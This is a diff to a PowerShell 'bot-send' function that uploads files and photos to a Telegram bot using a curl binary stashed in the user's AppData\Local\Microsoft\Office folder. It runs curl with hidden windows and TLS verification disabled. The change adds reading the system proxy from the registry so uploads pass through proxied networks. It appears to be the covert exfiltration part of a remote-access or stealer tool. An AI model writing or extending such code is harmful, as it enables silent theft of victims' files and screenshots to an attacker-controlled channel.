@@ -7,6 +7,7 @@ function bot-send {
 
 param ($photo,$file,$botkey,$chat_id)
 
+$proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
 $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
 $curl_zip = $ruta + "\curl_752_1.zip"
 $curl = $ruta + "\" + "curl.exe"
@@ -23,16 +24,15 @@ Remove-Item $curl ; Remove-Item $curl_zip
 if ($file -ne $null) {
 $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
-$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '
+if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '}
 Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}
 
 if ($photo -ne $null){
 
 $proceso = $curl_mod
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
-$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
+if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
 Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden
-
 
 }
 
